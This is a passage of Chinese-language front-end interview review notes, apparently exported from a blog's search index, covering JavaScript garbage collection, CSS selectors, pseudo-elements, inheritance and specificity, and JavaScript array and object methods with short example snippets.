1. 基础方案 Javascript引擎基础GC方案是（simple GC）：mark and sweep（标记清除），即： 遍历所有可访问的对象。 回收已不可访问的对象。 2. GC的缺陷 和其他语言一样，javascript的GC策略也无法避免一个问题：GC时，停止响应其他操作，这是为了安全考虑。而Javascript的GC在100ms甚至以上，对一般的应用还好，但对于JS游戏，动画对连贯性要求比较高的应用，就麻烦了。这就是新引擎需要优化的点：避免GC造成的长时间停止响应。 3. GC优化策略 David大叔主要介绍了2个优化方案，而这也是最主要的2个优化方案了： 分代回收（Generation GC） 这个和Java回收策略思想是一致的，也是V8所主要采用的。目的是通过区分“临时”与“持久”对象；多回收“临时对象”区（young generation），少回收“持久对象”区（tenured generation），减少每次需遍历的对象，从而减少每次GC的耗时。如图： 这里需要补充的是：对于tenured generation对象，有额外的开销：把它从young generation迁移到tenured generation，另外，如果被引用了，那引用的指向也需要修改。 这里主要内容可以参考 深入浅出Node 中关于内存的介绍，很详细~ 增量GC 这个方案的思想很简单，就是“每次处理一点，下次再处理一点，如此类推”。如图： 这种方案，虽然耗时短，但中断较多，带来了上下文切换频繁的问题。 因为每种方案都其适用场景和缺点，因此在实际应用中，会根据实际情况选择方案。 比如：低 (对象&#x2F;s) 比率时，中断执行GC的频率，simple GC更低些；如果大量对象都是长期“存活”，则分代处理优势也不大。 6、有什么方法可以保持前后端实时通信参考答案： 实现保持前后端实时通信的方式有以下几种 WebSocket： IE10以上才支持，Chrome16, FireFox11,Safari7以及Opera12以上完全支持，移动端形势大 event-source: IE完全不支持（注意是任何版本都不支持），Edge76，Chrome6,Firefox6,Safari5和Opera以上支持， 移动端形势大好 AJAX轮询： 用于兼容低版本的浏览器 永久帧（ forever iframe）可用于兼容低版本的浏览器 flash socket 可用于兼容低版本的浏览器 7、会阻塞dom解析的资源有：1.内联css 2.内联js 3.普通外联js 4.外联defer js 5.js之前的外联css css加载不会阻塞DOM树的解析 css加载会阻塞DOM树的渲染 css加载会阻塞后面js语句的执行 一、iframe会阻塞主页面的onload事件； 二、搜索引擎检索程序无法解读这种页面，不利于SEO； 三、会影响页面的并行加载。 并行加载：同一时间对同一域名下的加载数量是有限制的： MDN解析：当初始HTML文档已完全加载和解析时，将触发DOMContentLoaded事件，而不需要等待样式表，图像和子框架页面加载（事件可以用来检测HTML页面是否完全加载完毕(fully-loaded)）。 h5新特性 新的选择器：document.querySelector,document.querySelestorAll 拖拽释放Api：Drag,Drop 存储：sessionStorage,localStorage 媒体元素 video audio 页面间通信：postMessage 历史：history 全双工通信webSocket 语义化标签 绘画canvas 浏览器9种缓存方式 Http缓存：是基于Http协议的浏览器缓存方式 webSql：只有较高版本的Chrome浏览器支持 indexDB：是一个为了在客户端存储可观数量的结构化数据，并在这些数据上进行高性能索引的Api Cookie：通常是网站为了辨别用户身份进行Session存储 Localstorage：Html5新增的一种本地缓存方案，一般用于存储数据，加快下次渲染速度 sessionStorage：与localstorage类似，页面关闭就会销毁 application cache：将大部分js，css，图片等静态资源放在manifast文件配置中 cacheStorage :serverWorker规范中定义的 flash缓存：主要基于flash有读写浏览器端本地目录的功能 大前端是什么？简单来说，大前端就是所有前端的统称，比如Android、iOS、web、Watch等，最接近用户的那一层也就是UI层，然后将其统一起来，就是大前端。大前端最大的特点在于一次开发，同时适用于所有平台，开发者不用为一个APP需要做Android和iOS两种模式而担心。大前端是web统一的时代，利用web不仅能开发出网站，更可以开发手机端web应用和移动端应用程序。 大前端为什么出现？ 由于node的出现，前端工程师不需要依赖于后端程序而直接运行，从而前后端分离起来。所以当开发一个新产品的时候服务只需要写一次，但是面向用户的产品可能有很多，例如网站、Android客户端、iOS客户端和微信小程序等。由于各个平台使用的技术栈都不一样，代码无法复用，非常浪费人力、物力。那么有没有什么技术能够解决这一痛点呢？大前端应运而生，其实大前端的主要核心就是跨平台技术，有了跨平台技术，各个平台的差异性就抹平了，开发者只需要一套技术栈就可以开发出适用于多个平台的客户端。 跨平台方案简介 目前的主流跨平台方案：Cordova&#x2F;phoneGap、React Native、Weex、微信小程序、PWA和Flutter等，根据其原理性，可以分为三大类。 H5+原生（Cordova、Ionic、微信小程序）JavaScript开发+原生渲染 （React Native、Weex、快应用）自绘UI+原生(Flutter)增强版Web App(PWA)"},{"title":"重温前端-css篇","path":"/post/cc32.html","text":"CSS1.css选择某一个 (CSS :first-child 选择器,CSS选择器——伪类选择器)q:请将html模块中ul列表的第2个li标签和第4个li标签的背景颜色设置成”rgb(255, 0, 0)”。 &lt;html> &lt;head> &lt;meta charset=utf-8> &lt;style type=\"text/css\"> /*补全代码*/ &lt;/style> &lt;/head> &lt;body> &lt;ul> &lt;li>1&lt;/li> &lt;li>2&lt;/li> &lt;li>3&lt;/li> &lt;li>4&lt;/li> &lt;/ul> &lt;/body> &lt;/html> CSS :first-child 选择器：:first-child 选择器用于选取属于其父元素的首个子元素的指定选择器。 ul > :first-child + li&#123; margin-right: 50px; &#125; ul > :first-child + li + li+ li&#123; margin-right: 50px; &#125; 2、CSS 边框属性p &#123; border:5px solid red; &#125; 可以按顺序设置如下属性： border-width border-style border-color border-style可能的值 值 描述 none 定义无边框。 hidden 与 “none” 相同。不过应用于表时除外，对于表，hidden 用于解决边框冲突。 dotted 定义点状边框。在大多数浏览器中呈现为实线。 dashed 定义虚线。在大多数浏览器中呈现为实线。 solid 定义实线。 double 定义双线。双线的宽度等于 border-width 的值。 groove 定义 3D 凹槽边框。其效果取决于 border-color 的值。 ridge 定义 3D 垄状边框。其效果取决于 border-color 的值。 inset 定义 3D inset 边框。其效果取决于 border-color 的值。 outset 定义 3D outset 边框。其效果取决于 border-color 的值。 inherit 规定应该从父元素继承边框样式。 eg: 圣诞节来啦！请用CSS给你的朋友们制作一颗圣诞树吧~这颗圣诞树描述起来是这样的： 1. &quot;topbranch&quot;是圣诞树的上枝叶，该上枝叶仅通过边框属性、左浮动、左外边距即可实现。边框的属性依次是：宽度为100px、是直线、颜色为green（未显示的边框颜色都为透明） 2. &quot;middleBranch&quot;是圣诞树的中枝叶，该上枝叶仅通过边框属性即可实现。边框的属性依次是：宽度为200px、是直线、颜色为green（未显示的边框颜色都为透明） 3. &quot;base&quot;是圣诞树的树干，该树干仅通过左外边距实现居中于中枝叶。树干的宽度、高度分别为70px、200px，颜色为gray。 注意： 1. 上枝叶、树干的居中都是通过左外边距实现的 2. 没有显示的边框，其属性都是透明（属性） 3. 仅通过border属性完成边框的所有属性设置 &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=utf-8> &lt;style type=\"text/css\"> .topbranch &#123; width: 0px; height: 0px; /* * TODO: 上枝叶效果 */ float:left; border-bottom:100px solid green; border-left:100px solid transparent; border-right:100px solid transparent; border-top:100px solid transparent; margin-left:100px &#125; .middleBranch &#123; width: 0px; height: 0px; /* * TODO: 中枝叶效果 */ border-bottom:200px solid green; border-left:200px solid transparent; border-top:200px solid transparent; border-right:200px solid transparent; &#125; .base &#123; /* * TODO: 树干效果 */ width:70px; height:200px; background-color:gray; float:left; margin-left:165px &#125; &lt;/style> &lt;/head> &lt;body> &lt;section class=\"topbranch\">&lt;/section> &lt;section class=\"middleBranch\">&lt;/section> &lt;section class=\"base\">&lt;/section> &lt;/body> &lt;/html> 3、 CSS选择器——伪元素伪元素是一个附加在选择器末尾的关键词，通过伪元素您不需要借助元素的 ID 或 class 属性就可以对被选择元素的特定部分定义样式。例如通过伪元素您可以设置段落中第一个字母的样式，或者在元素之前、之后插入一些内容等等。 在 CSS1 和 CSS2 中，伪元素的使用与伪类相同，都是使一个冒号:与选择器相连。但在 CSS3 中，将伪元素单冒号的使用方法改为了使用双冒号::，以此来区分伪类和伪元素。因此，建议在使用伪元素时使用双冒号而不是单冒号。 selector::pseudo-element &#123; property: value; &#125; 其中，selector 为选择器，pseudo-element 为伪元素的名称，property 为 CSS 中的属性，value 为属性对应的值。 CSS 中提供了一系列的伪元素，如下表所示： 伪元素 例子 例子描述 ::after p::after 在每个 元素之后插入内容 ::before p::before 在每个 元素之前插入内容 ::first-letter p::first-letter 匹配每个 元素中内容的首字母 ::first-line p::first-line 匹配每个 元素中内容的首行 ::selection p::selection 匹配用户选择的元素部分 ::placeholder input::placeholder 匹配每个表单输入框（例如 input）的 placeholder 属性 1. ::after伪元素 ::after 能够在指定元素的后面插入一些内容，在 ::after 中需要使用 content 属性来定义要追加的内容，而且在 ::after 中必须定义 content 属性才会生效（没有需要插入的内容时可以将 content 属性的值定义为空&quot;&quot;）。 &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;style> p.one::after &#123; content:\"\"; display: inline-block; width: 50px; height: 10px; background: blue; &#125; p.two::after &#123; content:\"要插入的内容\"; color: red; font-size: 6px; &#125; p.three::after &#123; content: url('./smiley.gif'); position: relative; top: 8px; &#125; &lt;/style> &lt;/head> &lt;body> &lt;p class=\"one\">伪元素 ::after&lt;/p> &lt;p class=\"two\">伪元素 ::after&lt;/p> &lt;p class=\"three\">伪元素 ::after&lt;/p> &lt;/body> &lt;/html> 2. ::before伪元素 ::before 能够在指定元素的前面插入一些内容。与 ::after 相似，::before 中也需要使用 content 属性来定义要追加的内容，而且在 ::before 中必须定义 content 属性才会生效（没有需要插入的内容时可以将 content 属性的值定义为空&quot;&quot;）。 &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;style> p.one::before &#123; content:\"\"; display: inline-block; width: 50px; height: 10px; background: blue; &#125; p.two::before &#123; content:\"要插入的内容\"; color: red; font-size: 6px; &#125; p.three::before &#123; content: url('./smiley.gif'); position: relative; top: 8px; &#125; &lt;/style> &lt;/head> &lt;body> &lt;p class=\"one\">伪元素 ::before&lt;/p> &lt;p class=\"two\">伪元素 ::before&lt;/p> &lt;p class=\"three\">伪元素 ::before&lt;/p> &lt;/body> &lt;/html> 3. ::first-letter伪元素 ::first-letter 用来设置指定元素中内容第一个字符的样式，通常用来配合 font-size 和 float 属性制作首字下沉效果。需要注意的是，伪元素 ::first-letter 仅可以用于块级元素，行内元素想要使用该伪元素，则需要先将其转换为块级元素。 下面通过示例来演示伪元素 ::first-letter 的使用： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;style> p::first-letter&#123; font-size: 2em; color: blue; &#125; &lt;/style> &lt;/head> &lt;body> &lt;p>伪元素 ::first-letter&lt;/p> &lt;/body> &lt;/html> 4. ::first-line伪元素 ::first-line 用来设置指定元素中内容第一行的样式，与 ::first-letter 类似，伪元素 ::first-line 也仅可以用于块级元素，行内元素想要使用该伪元素，则需要先将其转换为块级元素。 下面通过示例来演示伪元素 ::first-line 的使用： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;style> p::first-line&#123; font-size: 1.5em; color: blue; font-weight: bold; &#125; &lt;/style> &lt;/head> &lt;body> &lt;p>伪元素 ::first-line 用来设置指定元素中内容第一行的样式，与 ::first-letter 类似，伪元素 ::first-line 也仅可以用于块级元素，行内元素想要使用该伪元素，则需要先将其转换为块级元素。&lt;/p> &lt;/body> &lt;/html> 5. ::selection伪元素 ::selection 用来设置对象被选中时的样式，需要注意的是，伪元素 ::selection 中只能定义元素被选中时的 color、background、cursor、outline 以及 text-shadow（IE11 尚不支持定义该属性）等属性。 下面通过示例来演示伪元素 ::selection 的使用： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;style> p::selection&#123; color: red; background-color: #CCC; &#125; &lt;/style> &lt;/head> &lt;body> &lt;p>伪元素 ::selection 用来设置对象被选中时的样式，需要注意的是，伪元素 ::selection 中只能定义元素被选中时的 color、background、cursor、outline 以及 text-shadow（IE11 尚不支持定义该属性）等属性。 &lt;/p> &lt;/body> &lt;/html> 运行结果如下图所示： 图：伪元素 ::selection 的使用 6. ::placeholder伪元素 ::placeholder 用来设置表单元素（input、textarea 元素）的占位文本（通过 HTML 的 placeholder 属性设置的文本），示例代码如下： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;style&gt; input.text::placeholder&#123; color: red; background-color: #CCC; &#125; &lt;&#x2F;style&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;input placeholder&#x3D;&quot;请输入一段文本&quot;&gt;未使用伪元素 ::placeholder&lt;br&gt; &lt;input placeholder&#x3D;&quot;请输入一段文本&quot; class&#x3D;&quot;text&quot;&gt;使用伪元素 ::placeholder 的效果 &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; 运行结果如下图所示： 4、圆角border-radius 5、浮动和清除浮动清除浮动: 父元素内联块元素 inline-block .father&#123; display:inline-block &#125; 6、固定定位position:fixed 7、CSS单位（一）em和rem简单的说 em: 就是字体大小，根据元素自身的字体大小来定，如果自身没有定义字体大小，则继承父元素的字体大小，即1em &#x3D; 1 font-size; rem: 和em差不多，可以看成是root-em，是根据根元素的字体大小来定义的，即html设置的字体大小来定义，默认html的字体大小是16px； 8、继承相关css的继承：就是给父级设置一些属性，子级继承了父级的该属性，这就是我们的css中的继承。 官方解释，继承是一种规则，它允许样式不仅应用于特定的html标签元素，而且应用于其后代元素。 无继承性的属性 1、display：规定元素应该生成的框的类型 2、文本属性： vertical-align：垂直文本对齐 text-decoration：规定添加到文本的装饰 text-shadow：文本阴影效果 white-space：空白符的处理 unicode-bidi：设置文本的方向 3、盒子模型的属性：width、height、margin 、margin-top、margin-right、margin-bottom、margin-left、border、 border-style、border-top-style、border-right-style、border-bottom-style、border-left-style、border-width、border-top-width、border-right-right、border-bottom-width、border-left-width、border-color、border-top-color、border-right-color、border-bottom-color、border-left-color、border-top、border-right、border-bottom、border-left、padding、padding-top、padding-right、padding-bottom、padding-left 4、背景属性：background、background-color、background-image、background-repeat、background-position、background-attachment 5、定位属性：float、clear、position、top、right、bottom、left、min-width、min-height、max-width、max-height、overflow、clip、z-index 6、生成内容属性：content、counter-reset、counter-increment 7、轮廓样式属性：outline-style、outline-width、outline-color、outline 8、页面样式属性：size、page-break-before、page-break-after 9、声音样式属性：pause-before、pause-after、pause、cue-before、cue-after、cue、play-during 有继承性的属性 1、字体系列属性 font：组合字体 font-family：规定元素的字体系列 font-weight：设置字体的粗细 font-size：设置字体的尺寸 font-style：定义字体的风格 font-variant：设置小型大写字母的字体显示文本，这意味着所有的小写字母均会被转换为大写，但是所有使用小型大写 字体的字母与其余文本相比，其字体尺寸更小。 font-stretch：对当前的 font-family 进行伸缩变形。所有主流浏览器都不支持。 font-size-adjust：为某个元素规定一个 aspect 值，这样就可以保持首选字体的 x-height。 2、文本系列属性 text-indent：文本缩进 text-align：文本水平对齐 line-height：行高 word-spacing：增加或减少单词间的空白（即字间隔） letter-spacing：增加或减少字符间的空白（字符间距） text-transform：控制文本大小写 direction：规定文本的书写方向 color：文本颜色 a元素除外 3、元素可见性：visibility 4、表格布局属性：caption-side、border-collapse、border-spacing、empty-cells、table-layout 5、列表布局属性：list-style-type、list-style-image、list-style-position、list-style 6、生成内容属性：quotes 7、光标属性：cursor 8、页面样式属性：page、page-break-inside、windows、orphans 9、声音样式属性：speak、speak-punctuation、speak-numeral、speak-header、speech-rate、volume、voice-family、 pitch、pitch-range、stress、richness、、azimuth、elevation 所有元素可以继承的属性 1、元素可见性：visibility 2、光标属性：cursor 内联元素可以继承的属性 1、字体系列属性 2、除text-indent、text-align之外的文本系列属性 块级元素可以继承的属性 1、text-indent、text-align 9、css预处理工具参考答案： CSS 预处理器是一个能让你通过预处理器自己独有的语法来生成CSS的程序。 css预处理器种类繁多，三种主流css预处理器是Less、Sass（Scss）及Stylus；它们各自的背景如下: Sass： 2007年诞生，最早也是最成熟的CSS预处理器，拥有ruby社区的支持和compass这一最强大的css框架，目前受LESS影响，已经进化到了全面兼容CSS的SCSS（SCSS 需要使用分号和花括号而不是换行和缩进）。 Less： 2009年出现，受SASS的影响较大，但又使用CSS的语法，让大部分开发者和设计师更容易上手，在ruby社区之外支持者远超过SASS。其缺点是比起SASS来，可编程功能不够。优点是简单和兼容CSS，反过来也影响了SASS演变到了SCSS的时代，著名的Twitter Bootstrap就是采用LESS做底层语言的。 Stylus： 2010年产生，来自Node.js社区，主要用来给Node项目进行CSS预处理支持，在此社区之内有一定支持者，在广泛的意义上人气还完全不如SASS和LESS。 比较 在使用 CSS 预处理器之前最重要的是理解语法，幸运的是基本上大多数预处理器的语法跟 CSS 都差不多。 首先 Sass 和 Less 都使用的是标准的 CSS 语法，因此如果可以很方便的将已有的 CSS 代码转为预处理器代码，默认 Sass 使用 .sass 扩展名，而 Less 使用 .less 扩展名。 h1 &#123; color: #0982C1; &#125; 这是一个再普通不过的，不过 Sass 同时也支持老的语法，就是不包含花括号和分号的方式： h1 color: #0982c1 而 Stylus 支持的语法要更多样性一点，它默认使用 .styl 的文件扩展名，下面是 Stylus 支持的语法 /* style.styl */ h1 &#123; color: #0982C1; &#125; /* omit brackets */ h1 color: #0982C1; /* omit colons and semi-colons */ h1 color #0982C1 可以在同一个样式单中使用不同的变量，例如下面的写法也不会报错： h1 &#123; color #0982c1 &#125; h2 font-size: 1.2em 10、行内元素和块级元素什么区别，然后怎么相互转换参考答案: 块级元素 1.总是从新的一行开始，即各个块级元素独占一行，默认垂直向下排列； 2.高度、宽度、margin及padding都是可控的，设置有效，有边距效果； 3.宽度没有设置时，默认为100%； 4.块级元素中可以包含块级元素和行内元素。 行内元素 1.和其他元素都在一行，即行内元素和其他行内元素都会在一条水平线上排列； 2.高度、宽度是不可控的，设置无效，由内容决定。 3.根据标签语义化的理念，行内元素最好只包含行内元素，不包含块级元素。 转换 当然块级元素与行内元素之间的特性是可以相互转换的。HTML可以将元素分为行内元素、块状元素和行内块状元素三种。 使用display属性能够将三者任意转换： (1)display:inline;转换为行内元素； (2)display:block;转换为块状元素； (3)display:inline-block;转换为行内块状元素。 11、样式优先级参考答案： 样式类型 样式类型分为三类 行间 &lt;h1 style=\"font-size:12px;color:#000;\">我的行间CSS样式。&lt;/h1> 内联 &lt;style type=\"text/css\"> h1&#123;font-size:12px; color:#000; &#125; &lt;/style> 外部 &lt;link rel=\"stylesheet\" href=\"css/style.css\"> 选择器类型 1、ID #id 2、class .class 3、标签 p 4、通用 * 5、属性 [type&#x3D;”text”] 6、伪类 :hover 7、伪元素 ::first-line 8、子选择器、相邻选择器 权重计算规则 第一等：代表内联样式，如: style&#x3D;””，权值为1000。第二等：代表ID选择器，如：#content，权值为0100。第三等：代表类，伪类和属性选择器，如.content，权值为0010。第四等：代表类型选择器和伪元素选择器，如div p，权值为0001。通配符、子选择器、相邻选择器等的。如*、&gt;、+,权值为0000。继承的样式没有权值。 比较规则 遵循如下法则： 选择器都有一个权值，权值越大越优先； 当权值相等时，后出现的样式表设置要优于先出现的样式表设置； 创作者的规则高于浏览者：即网页编写者设置的 CSS 样式的优先权高于浏览器所设置的样式； 继承的 CSS 样式不如后来指定的 CSS 样式； 在同一组属性设置中标有!important规则的优先级最大 通配符、子选择器、相邻选择器等的。虽然权值为0000，但是也比继承的样式优先。 ！important !important 的作用是提升优先级，换句话说。加了这句的样式的优先级是最高的（比内联样式的优先级还高)。 &lt;style> p&#123; color:red !important; &#125; &lt;/style> &lt;p style=\"color:blue;\">我显示红色&lt;/p> ie7+和别的浏览器对important的这种作用的支持度都很好。只有ie6有些bug p&#123; color:red !important; color:blue; &#125;//会显示blue 但是这并不说明ie6不支持important，只是支持上有些bug。看下面 p&#123; color:red !important; &#125; p&#123; color:blue; &#125; //这样就会显示的是red。说明ie6还是支持important的。&lt;/pre> 12、盒子塌陷是什么？参考答案： 盒子塌陷 本应该在父盒子内部的元素跑到了外部。 原因： 当父元素没设置足够大小的时候，而子元素设置了浮动的属性，子元素就会跳出父元素的边界（脱离文档流），尤其是当父元素的高度为auto时，而父元素中又没有其它非浮动的可见元素时，父盒子的高度就会直接塌陷为零， 我们称这是CSS高度塌陷。 关于盒子塌陷的几种解决方法 （1）最简单，直接，粗暴的方法就是盒子大小写死，给每个盒子设定固定的width和height，直到合适为止，这样的好处是简单方便，兼容性好，适合只改动少量内容不涉及盒子排布的版面。缺点是非自适应，浏览器的窗口大小直接影响用户体验。 （2）给外部的父盒子也添加浮动，让其也脱离标准文档流，这种方法方便，但是对页面的布局不是很友好，不易维护。 （3）给父盒子添加overflow属性。 overflow:auto; 有可能出现滚动条，影响美观。 overflow:hidden; 可能会带来内容不可见的问题。 （4）父盒子里最下方引入清除浮动块。最简单的有： &lt;br style=\"clear:both;\"/> 有很多人是这么解决的，但是我们并不推荐，因为其引入了不必要的冗余元素 。 (5)用after伪元素清除浮动 给外部盒子的after伪元素设置clear属性，再隐藏它 这其实是对空盒子方案的改进，一种纯CSS的解决方案，不用引入冗余元素。 .clearfix &#123;*zoom: 1;&#125; .clearfix:before,.clearfix:after &#123; display: table; line-height: 0; content: \"\"; &#125; .clearfix:after &#123;clear: both;&#125; 这也是bootstrap框架采用的清除浮动的方法。 这是一种纯CSS的解决浮动造成盒子塌陷方法，没有引入任何冗余元素，推荐使用此方法来解决CSS盒子塌陷。 备注：第五种方法虽好，但是低版本IE不兼容，具体选择哪种解决方法，可根据实际情况决定。 (6) 给父盒子添加border (7) 给父盒子设置padding-top 13、css 伪类与伪元素区别参考答案： 伪类(pseudo-classes) 其核⼼就是⽤来选择DOM树之外的信息,不能够被普通选择器选择的⽂档之外的元素，⽤来添加⼀些选择器的特殊效果。 ⽐如:hover :active :visited :link :visited :first-child :focus :lang等 由于状态的变化是⾮静态的，所以元素达到⼀个特定状态时，它可能得到⼀个伪类的样式；当状态改变时，它⼜会失去这个样式。 由此可以看出，它的功能和class有些类似，但它是基于⽂档之外的抽象，所以叫 伪类。 伪元素(Pseudo-elements) DOM树没有定义的虚拟元素 核⼼就是需要创建通常不存在于⽂档中的元素， ⽐如::before ::after 它选择的是元素指定内容，表示选择元素内容的之前内容或之后内容。 伪元素控制的内容和元素是没有差别的，但是它本身只是基于元素的抽象，并不存在于⽂档中，所以称为伪元素。⽤于将特殊的效果添加到某些选择器 伪类与伪元素的区别 表示⽅法 CSS2 中伪类、伪元素都是以单冒号:表示, CSS2.1 后规定伪类⽤单冒号表示,伪元素⽤双冒号::表示， 浏览器同样接受 CSS2 时代已经存在的伪元素(:before, :after, :first�line, :first-letter 等)的单冒号写法。 CSS2 之后所有新增的伪元素(如::selection)，应该采⽤双冒号的写法。 CSS3中，伪类与伪元素在语法上也有所区别，伪元素修改为以::开头。浏览器对以:开头的伪元素也继续⽀持，但建议规范书写为::开头 定义不同 伪类即假的类，可以添加类来达到效果 伪元素即假元素，需要通过添加元素才能达到效果 总结: 伪类和伪元素都是⽤来表示⽂档树以外的”元素”。 伪类和伪元素分别⽤单冒号:和双冒号::来表示。 伪类和伪元素的区别，关键点在于如果没有伪元素(或伪类)， 是否需要添加元素才能达到效果，如果是则是伪元素，反之则是伪类 伪类和伪元素都不出现在源⽂件和DOM树中。也就是说在html源⽂件中是看不到伪类和伪元素的。 伪类其实就是基于普通DOM元素⽽产⽣的不同状态，他是DOM元素的某⼀特征。 伪元素能够创建在DOM树中不存在的抽象对象，⽽且这些抽象对象是能够访问到的。 14、行内元素的margin 和 padding参考答案： 水平方向：水平方向上，都有效； 垂直方向：垂直方向上，都无效；（padding-top 和 padding-bottom 会显示出效果，但是高度不会撑开，不会对周围元素有影响） 15、min-width&#x2F;max-width 和 min-height&#x2F;max-height 属性间的覆盖规则？参考答案： max-width 会覆盖 width，即使 width 是行内样式或者设置了 !important。 min-width 会覆盖 max-width，此规则发生在 min-width 和 max-width 冲突的时候； 16、未知高度元素垂直居中、水平居中的实现方式有哪些？参考答案： 1、绝对定位+css3 transform:translate(-50%，-50%) .wrap&#123; position:relative; &#125; .child&#123; position: absolute; top:50%; left:50%; -webkit-transform:translate(-50%,-50%); &#125; 2、css3 的flex布局 .wrap&#123; display:flex; justify-content:center; &#125; .child&#123; align-self:center; &#125; 3、table布局 &lt;div class=\"wrap\"> &lt;div class=\"child\"> &lt;div>sadgsdgasgd&lt;/div> &lt;/div> &lt;/div> .wrap&#123; display:table; text-align:center; &#125; .child&#123; background:#ccc; display:table-cell; vertical-align:middle; &#125; .child div&#123; width:300px; height:150px; background:red; margin:0 auto; &#125; 17.继承css属性分为继承属性和非继承属性 继承属性的默认值为父元素的该属性的 计算值，非继承属性和根元素的继承属性的默认值为初始值。 对于非继承属性，可以显示的声明属性值为 inherit，让子元素的属性继承父元素。 常见的继承属性：​ 字体 font 系列​ 文本 text-align text-ident line-height letter-spacing​ 颜色 color列表 list-style可见性 visibility光标 cursor 18.什么是浮动，如何清除浮动？"},{"title":"重温前端-js篇","path":"/post/c03c.html","text":"Javascript1、JS中的instanceof运算符instanceof运算符用来判断一个构造函数的prototype属性所指向的对象是否存在另外一个要检测对象的原型链上 obj instanceof Object;&#x2F;&#x2F;true 实例obj在不在Object构造函数中 eg： 请补全JavaScript函数，要求以Boolean的形式返回第一个参数是否属于第二个参数对象的实例。 function _instanceof(left,right) &#123; &#x2F;&#x2F; 补全代码 return (left instanceof right ) &#125; 2、排序sort() 方法对数组的项目进行排序。 按升序对数组中的数字进行排序： var points &#x3D; [40, 100, 1, 5, 25, 10]; points.sort(function(a, b)&#123;return a-b&#125;); 按降序对数组中的数字进行排序： var points &#x3D; [40, 100, 1, 5, 25, 10]; points.sort(function(a, b)&#123;return b-a&#125;); 3、JS字符串大写和小写之间的转换String 字符串大小写转换方法 字符串方法 说明 toLocaleLowerCase() 把字符串转换成小写 toLocaleUpperCase() 将字符串转换成大写 toLowerCase() 将字符串转换成小写 toUpperCase() 将字符串转换成大写 var s = \"JavaScript\"; console.log(s.toUpperCase()); 4、javascript如何删除指定数组元素 使用delete关键字； var colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;, &quot;green&quot;]; delete colors[0]; console.log(colors); &#x2F;&#x2F; [undefined, &quot;blue&quot;, &quot;grey&quot;, &quot;green&quot;] 使用delete删除元素之后数组长度不变，只是被删除元素被置为undefined了 使用splice()操作方法； var colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;]; var color &#x3D; colors.splice(0, 1); console.log(color); &#x2F;&#x2F; &quot;red&quot; console.log(colors); &#x2F;&#x2F; [&quot;blue&quot;, &quot;grey&quot;] 在删除数组元素的时候，它可以删除任意数量的项，只需要指定2个参数：要删除的第一项的位置和要删除的项数。 迭代方法，用循环迭代数组元素，发现符合要删除的项则删除； 第一种用最常见的ForEach循环来对比元素找到之后将其删除。 var colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;]; colors.forEach(function(item, index, arr) &#123; if(item &#x3D;&#x3D;&#x3D; &quot;red&quot;) &#123; arr.splice(index, 1); &#125; &#125;) var colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;]; colors &#x3D; colors.filter(function(item) &#123; return item !&#x3D; &quot;red&quot;&#125;); console.log(colors); &#x2F;&#x2F; [&quot;blue&quot;, &quot;grey&quot;] prototype原型方法，在Array的原型上添加方法来达到删除的目的。 5、数组方法数组方法概括 方法名 对应版本 功能 原数组是否改变 concat() ES5- 合并数组，并返回合并之后的数据 n join() ES5- 使用分隔符，将数组转为字符串并返回 n pop() ES5- 删除最后一位，并返回删除的数据 y shift() ES5- 删除第一位，并返回删除的数据 y unshift() ES5- 在第一位新增一或多个数据，返回长度 y push() ES5- 在最后一位新增一或多个数据，返回长度 y reverse() ES5- 反转数组，返回结果 y slice() ES5- 截取指定位置的数组，并返回 n sort() ES5- 排序（字符规则），返回结果 y splice() ES5- 删除指定位置，并替换，返回删除的数据 y toString() ES5- 直接转为字符串，并返回 n valueOf() ES5- 返回数组对象的原始值 n indexOf() ES5 查询并返回数据的索引 n lastIndexOf() ES5 反向查询并返回数据的索引 n forEach() ES5 参数为回调函数，会遍历数组所有的项，回调函数接受三个参数，分别为value，index，self；forEach没有返回值 n map() ES5 同forEach，同时回调函数返回数据，组成新数组由map返回 n filter() ES5 同forEach，同时回调函数返回布尔值，为true的数据组成新数组由filter返回 n every() ES5 同forEach，同时回调函数返回布尔值，全部为true，由every返回true n some() ES5 同forEach，同时回调函数返回布尔值，只要由一个为true，由some返回true n reduce() ES5 归并，同forEach，迭代数组的所有项，并构建一个最终值，由reduce返回 n reduceRight() ES5 反向归并，同forEach，迭代数组的所有项，并构建一个最终值，由reduceRight返回 n 用slice(0)复制一个数组 a.splice(index,0,item)：在数组a的第index位置插入item 最大值 ;Math.max.apply(Math,array) 6、对象Number 对象Number 对象是原始数值的包装对象，创建 Number 对象的语法格式如下： var myNum &#x3D; new Number(value); var myNum &#x3D; Number(value); 其中 value 为要创建的 Number 对象的数值，若 value 为一个非数字的值，则会尝试将其转换为数字，若转换失败则会返回 NaN。 eg:请补全JavaScript函数，要求将数字参数转换为对象的形式返回。 function _numbertoobject(number) &#123; &#x2F;&#x2F; 补全代码 var myNum &#x3D; new Number(number); return myNum &#125; 对象字符串JavaScript String 对象用于处理字符串，其中提供了大量操作字符串的方法，以及一些属性。 创建 String 对象的语法格式如下： var val &#x3D; new String(value); var val &#x3D; String(value); 对象属性遍历： 使用 for in 循环遍历对象的属性时，原型链上的所有属性都将被访问： var obj=&#123;\"name\":\"wjy\",\"age\":26,\"sex\":\"female\"&#125;;//定义一个object对象 var keys=[];//定义一个数组用来接受key var values=[];//定义一个数组用来接受value for(var key in obj)&#123; keys.push(key); values.push(obj[key]);//取得value &#125; alert(\"keys is ：\"+keys+\" and values is ：\"+values); Object.keys(xx)&#x2F;Object.values(xx) console.log(Object.keys(obj)); console.log(Object.values(obj)); //输出：[\"name\", \"career\"] //输出：[ \"Poly\", \"it\"] 添加属性//创建obj对象 var obj = new Object(); //为对象添加动态属性 obj.userName = \"admin\"; obj.passWord = \"123456\"; //输出 console.log(obj); 删除对象属性//创建obj动态对象 var obj = new Object(); //为对象添加动态属性 obj.userName = \"admin\"; obj.passWord = \"123456\"; 